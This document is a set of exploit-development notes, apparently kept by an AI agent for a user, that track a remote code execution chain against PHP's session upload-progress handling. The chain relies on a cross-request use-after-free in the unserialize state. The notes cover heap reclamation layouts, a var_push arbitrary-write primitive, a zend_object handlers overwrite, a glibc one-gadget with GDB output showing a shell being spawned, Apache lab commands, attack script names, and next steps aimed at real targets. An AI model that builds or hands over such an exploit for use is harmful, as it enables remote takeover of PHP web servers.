# New root cause: pre-RINIT `BG(unserialize)` cross-request residual UAF (pure HTTP research track)

This file records the new exploit chain provided by the user and the independent reproduction progress for this research track. **The earlier custom-PHP exploitation via `session_unset`/`session_encode` is no longer considered a valid result** (it violates the "no target-specific PHP, fully remote" requirement), and the relevant pages have been moved out of the webroot.

---

## 1. New chain (user intelligence)

1. The first request OOMs while decoding a large session in upload-progress, leaving `BG(unserialize).level=1` and a **dangling `data` pointer to a freed object**.
2. The second request reclaims that 8216-byte object with two 8214-byte multipart parameters.
3. Use backslash folding to construct a valid 48-bit `data->last` pointer.
4. The binary progress marker forges `var_entries`, turning `var_push` into a write to an address of choice.
5. A two-level `var_entries` trampoline finally overwrites `zend_object->handlers`.
6. Object destruction enters the glibc one-gadget; GDB confirms:
   ```
   VAR_PUSH ... destination=0x7f9d62671000 rval=0x7f9d62664980
   VAR_PUSH ... destination=0x7f9d62602608 rval=0x7f9d62664940
   process 2544 is executing new program: /usr/bin/dash
   ```

The vulnerability is not the progress cache bucket UAF claimed by public analysis, but **pre-RINIT `BG(unserialize)` state persisting across requests**.

---

## 2. Source mapping

### 2.1 The 8216-byte object

`ext/standard/var_unserializer.re`:

```c
#define VAR_ENTRIES_MAX 1018
typedef struct {
    zend_long used_slots;     // 8
    void *next;               // 8
    zval *data[1018];         // 8144
} var_entries;                // 8160

struct php_unserialize_data {
    var_entries      *last;          // 0
    var_dtor_entries *first_dtor;    // 8
    var_dtor_entries *last_dtor;     // 16
    HashTable        *allowed_classes; // 24
    HashTable        *ref_props;     // 32
    zend_long         cur_depth;     // 40
    zend_long         max_depth;     // 48
    var_entries       entries;       // 56
};                                    // sizeof = 56 + 8160 = 8216
```

gdb has confirmed `sizeof(struct php_unserialize_data) == 8216`.

### 2.2 Lifecycle

```c
php_var_unserialize_init():
    if (BG(serialize_lock) || !BG(unserialize).level) {
        d = emalloc(8216);
        d->last = &d->entries;
        ...
        BG(unserialize).data = d;
        BG(unserialize).level = 1;
    } else {
        d = BG(unserialize).data;   // stale reuse
        ++BG(unserialize).level;
    }

php_var_unserialize_destroy():
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d); efree(d);
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level)
        BG(unserialize).data = NULL;
```

OOM/`zend_bailout` skips `PHP_VAR_UNSERIALIZE_DESTROY`; `level` remains 1 and `data` dangles; the next pre-RINIT `unserialize` reuses the structure directly.

### 2.3 `var_push` write primitive

```c
static inline void var_push(php_unserialize_data_t *var_hashx, zval *rval)
{
    var_entries *var_hash = (*var_hashx)->last;
    if (var_hash->used_slots == VAR_ENTRIES_MAX) {
        var_hash = emalloc(sizeof(var_entries));
        ...
        (*var_hashx)->last->next = var_hash;
        (*var_hashx)->last = var_hash;
    }
    var_hash->data[var_hash->used_slots++] = rval;
}
```

If `data->last` is attacker-controlled, the write address is:

```text
*(zval**)(last + offsetof(var_entries, data) + used_slots*8) = rval
= last + 16 + used_slots*8
```

`rval` is a `zval*` (a predictable unserializer temporary address); `used_slots` can also be controlled through the contents used to reclaim the allocation. A two-level trampoline can use the pointer written by the first write as the `last`/target of the second, ultimately overwriting `zend_object->handlers`, so that object destruction enters the one-gadget.

---

## 3. Pure-HTTP reproduction progress for this research track

### 3.1 Prerequisite: create a large session via upload-progress (pure HTTP)

- The Apache lab configuration can be switched: 64M + `session.upload_progress.cleanup Off` to create files; 8M + cleanup On for A/B.
- Request 0: multipart `PHPSESSID` + `PHP_SESSION_UPLOAD_PROGRESS=<4MB 'A'>` + file part.
- Measured: `/tmp/sess_bgtest123` = **4,194,655 bytes**.
- Small session: `/tmp/sess_bgsmall123` = 351 bytes, used for normal decoding in the second request.

### 3.2 Request A: post-RINIT large-session decode OOM

The target page is a plain session page:

```php
<?php session_start(); echo "ok\n"; ?>
```

Request: `GET /index.php`, `Cookie: PHPSESSID=bgtest123`. Decoding the 4MB of session data triggers OOM under the 8M limit.

Measured:

```text
HTTP/1.1 200 OK
Fatal error: Allowed memory size of 8388608 bytes exhausted ...

basic_globals.unserialize.level = 1
basic_globals.unserialize.data  = 0x7ffff5e6d000
```

That `data` is `php_unserialize_data` (8216B); `last=&entries` (+0x38). After request shutdown the object has been freed (the BG pointer dangles).

### 3.3 Request B: pre-RINIT reuses the dangling BG, parameters reclaim the structure

Shape (`tools/bg_b.py` / `tools/bg_b_file.py`):

- No file: `PHPSESSID=bgsmall123`, `PHP_SESSION_UPLOAD_PROGRESS=pwn`, two 8214-byte fields `p1`/`p2` (10-character boundary).
- END cleanup runs before RINIT and calls `php_session_initialize` → `s_read` → `php_var_unserialize_init`, reusing the stale `BG.data`.

gdb observations:

```text
INIT level=1 data=0x7ffff5e6d000
0x7ffff5e6d000: 0x00007ffff5e6d030 0x41da9b9294603d72
0x7ffff5e6d010: 0x00007ffff5e6d020 0x51da9b9294603d72
0x7ffff5e6d020: 0x00007ffff5e6d000 0x71da9b9294603d72
0x7ffff5e6d030: 0x00007ffff5e6d040 0x31da9b9294603d72
INIT level=0 data=(nil)
```

- `BG.level=1` and `data` is still A's address, indicating that pre-RINIT reuse succeeded;
- the 8216-byte structure has been overwritten by multipart content; fields such as `data->last` have become pointers into the structure (0x...6d030/6d020/6d000/6d040);
- In the version with a file (`bg_b_file.py`), during FILE_START decoding the structure is reclaimed by multipart header content such as `a.bin`/`Content-`, and decoding then crashes while dereferencing `last_dtor` at `tmp_var`:

```text
INIT level=1 data=0x7ffff5e6d000
0x...6d000: 0x0000006e69622e61 0x554acc7090e8c40e
0x...6d010: 0x2d746e65746e6f43 0x354acc0065707954
0x...6d020: 0x00007ffff5e6d040 0x554acc7090e8c40e
SIGSEGV addr=(nil)
#0 tmp_var (num=1, ...)
#1 var_tmp_var
#2 ps_srlzr_decode_php
#3 php_session_decode
#4 php_session_initialize
#5 php_session_rfc1867_update
#6 php_session_rfc1867_callback
#7 rfc1867_post_handler
```

### 3.4 Confirmed facts

- `BG(unserialize).level=1` and `data` persist across requests after A's post-RINIT OOM;
- B's pre-RINIT `php_var_unserialize_init` reuses the dangling `data` (no new allocation);
- two 8214-byte multipart parameters/parser buffers can overwrite the 8216-byte structure;
- structure fields are used as `var_entries`/`var_dtor_entries` pointers, and `tmp_var`/`var_push` read and write along these pointers (`tmp_var` crashes have already occurred).

### 3.5 Not yet completed

- Use the "backslash folding" from the user's chain to precisely control `data->last` as **an arbitrary valid 48-bit pointer**, rather than the current self-pointer into the structure;
- construct a fake `var_entries`, control `used_slots`, and turn `var_push` into a target-address write;
- two-level trampoline overwriting `zend_object->handlers`, and the glibc one-gadget address (requires a leak under ASLR);
- make A's OOM/large-session preparation a fully remote, repeatable process (the current lab requires switching the Apache configuration between 64M/cleanup Off and 8M/cleanup On; a real target depends on the application's own large session and memory_limit).

---

## 4. Reproduction commands (lab)

```bash
# 1) create session with 64M + cleanup Off (pure HTTP)
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 64M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup Off/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
cd ~/php-lab
SID=bgsmall123 python3 bg_create.py 8
SID=bgtest123 python3 bg_create.py 4194304

# 2) 8M + cleanup On, A decodes the large session and OOMs
sudo sed -i 's/php_admin_value memory_limit .*/php_admin_value memory_limit 8M/; s/php_admin_value session.upload_progress.cleanup .*/php_admin_value session.upload_progress.cleanup On/' /etc/apache2/conf-available/php8426.conf
sudo apache2ctl -k stop; sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
python3 bg_cookie_a.py        # GET + Cookie PHPSESSID=bgtest123, confirm OOM

# 3) B: pre-RINIT reuses BG
python3 bg_b.py               # no file, two 8214-byte parameters
# or python3 bg_b_file.py     # with file, decode at FILE_START
```

gdb observation points:

```gdb
b php_var_unserialize_init
commands
silent
printf "INIT level=%u data=%p\n", basic_globals.unserialize.level, basic_globals.unserialize.data
x/8gx basic_globals.unserialize.data
continue
end
```

---

## 5. Relation to the old documents

- The custom-PHP exploitation via `session_unset`/`session_encode` in Sections 3/10 of `NOTES.md` is **no longer a valid deliverable**; it demonstrated Defect D/leak mechanisms but violates the current constraint of "no target-specific PHP, pure HTTP".
- The old exploit pages have been moved to `~/php-lab/offline/`, and the webroot retains only a plain `index.php`.
- The new approach continues to be based on the `BG(unserialize)` UAF; the next core step is the precise layout of the fields in the 8216-byte structure and the two-level `var_push` write.

---

## 6. Reference logs

- `logs/bg_gf.log` — post-RINIT A + B pre-RINIT `INIT level=1` (version where the structure is not overwritten by parameters).
- `logs/bg_gi.log` — post-RINIT A + B with a file, structure reclaimed by multipart content and crashes at `tmp_var`.
- `logs/bg_gj.log` — post-RINIT A + B without a file, two 8214-byte parameters, self-pointers within the structure.

---

## 7. 2026-10-21 addendum: allocator behavior revealed by watchpoints (the last obstacle before RCE)

Setting a hardware watchpoint on `BG.data` after A (in this case `0x7ffff5e6d000`), then sending B (no file, two 8214-byte parameters), yields:

```text
WATCH#1 val=0x7461642d6d726f66   # "form-data"
  #0 memcpy
  #1 _estrndup
  #2 php_ap_getword
  #3 rfc1867_post_handler
WATCH#2 val=0x7ffff5e6d010
  #0 zend_mm_set_next_free_slot
  #1 zend_mm_free_small (bin_num=1, ptr=0x7ffff5e6d000)
  #2 zend_mm_free_heap
  #3 _efree
  #4 rfc1867_post_handler
WATCH#3 val=0x7fff656d616e   # "name="
WATCH#6 val=0x316c6c616d736762 # "bgsmall1" (PHPSESSID value)
  #1 multipart_buffer_read_body
```

Conclusion: in our post-RINIT A scenario, **the 8216-byte `php_unserialize_data` chunk has already been recycled by Zend MM and split into 16-byte small bins**; during B parsing, small strings such as `_estrndup("form-data")`, `"name="`, and the PHPSESSID value repeatedly occupy `0x...6d000`; therefore the two 8214-byte parameters do not occupy that address as a whole block as expected, and `data->last` reads a small-bin free-list pointer (0x...6d030 etc.), not an attacker-controllable 48-bit pointer.

`zend_mm_free_small(bin_num=1)` corresponds to the smallest 16-byte bin; `form-data`(10B)/`name=`(6B)/`bgsmall123`(11B) all fall into this bin. The 56-byte struct header is split across four 16B slots at `0x...6d000/6d010/6d020/6d030`, and the free list overwrites the first qword of each slot.

### Next steps (RCE)

1. **Keep the 8216-byte block as a large free block** instead of splitting it into small bins:
   - try different ways of ending A (pre-RINIT OOM without shutdown vs post-RINIT shutdown; `unclean_shutdown`/`report_memleaks` flags), so that heap recycling at B startup leaves the chunk on the large-free list;
   - or allocate an 8193/8215-byte large buffer at the very beginning of B (front-loading the two 8214-byte parameters) to occupy the chunk before the small-bin split.
2. Once `data->last` is controllable:
   - set `last_dtor=0` so `tmp_var` takes the `emalloc` branch;
   - forge `var_entries` (`used_slots`, `next`, `data[]`) in the parameter buffer/adjacent large chunk, and set the write target of `var_push` to `zend_object->handlers`;
   - two-level trampoline + object destruction + glibc one-gadget.
3. Leave ASLR until after RCE: the new chain has no ready-made pure-HTTP leak; consider read/write constructed by the `var_push` write itself, or a controlled out-of-bounds read of the same BG UAF; do not use the previous custom-PHP `session_encode` leak again.

### Evidence

- Raw watchpoint log: `logs/bg_watch.log` (this round `/tmp/gw.log`).

---

## 8. The real prerequisite for RCE: `BG(serialize_lock)=1` (target-app dependency)

Source verification results:

```c
PHPAPI void php_var_unserialize_destroy(php_unserialize_data_t d) {
    if (BG(serialize_lock) || BG(unserialize).level == 1) {
        var_destroy(&d);
        efree(d);                 // free the 8216-byte block
    }
    if (!BG(serialize_lock) && !--BG(unserialize).level) {
        BG(unserialize).data = NULL;
    }
}
```

Only when `BG(serialize_lock) == 1` does the dangling state "**d has been efree'd, but BG.level is still 1 and BG.data still points to d**" occur; this is also the source of the large-free chunk (which will not be split into small bins by a full-heap shutdown).

Locations of `BG(serialize_lock)++/--`:

- `ext/standard/var_unserializer.re` around lines 277/294: before and after calling the object `__wakeup` / `__unserialize`;
- before and after class lookup/autoload/unserialize_callback_func calls (around lines 1232/1256/1268);
- `ext/standard/var.c` 855/876: serialize magic methods.

Therefore the attack chain's first request must be: **the session data contains an object whose `__wakeup`/`__unserialize` (or autoload/unserialize_callback_func) triggers OOM during decoding**. The OOM's `zend_bailout` skips `BG(serialize_lock)--`; the outer destroy then sees lock=1, calls `efree(d)` but does not clear BG, leaving a dangling 8216-byte block on the large-free list.

In our lab, the large session contains only arrays/strings (progress data generated by upload-progress), with no object magic methods, so:

- Normal decode OOM: destroy never executes, `d` is still allocated (in our earlier pre-RINIT A, the `data` memory was intact);
- post-RINIT OOM + request shutdown: the whole heap is recycled, the 8216-byte block is split into 16-byte small bins (confirmed by watchpoint), and the 8214-byte parameters cannot reclaim it as a whole block.

**Conclusion: this chain is unreachable on "vanilla session page + array session constructed over pure HTTP"; it requires the target application to put an object with `__wakeup`/`__unserialize` into the session (or to configure autoload/unserialize_callback_func).** This is an application-layer dependency that B request parameters cannot supply.

### Decision needed to continue

- Allow adding a **verification-only scaffold class** to the lab target page (`__wakeup` performs a large allocation to OOM), to first get the later `var_entries`/`zend_object->handlers`/one-gadget working; the final exploit will not include that PHP, treating it only as a stand-in for a gadget already present in the target application.
- Or provide the object/class in the real target application that enters the session (which application, which session key, what magic method), and I will construct the large session according to that object.
- Until either condition is available, forcing it on a vanilla page can only rely on forged/custom PHP, which violates the current constraint.
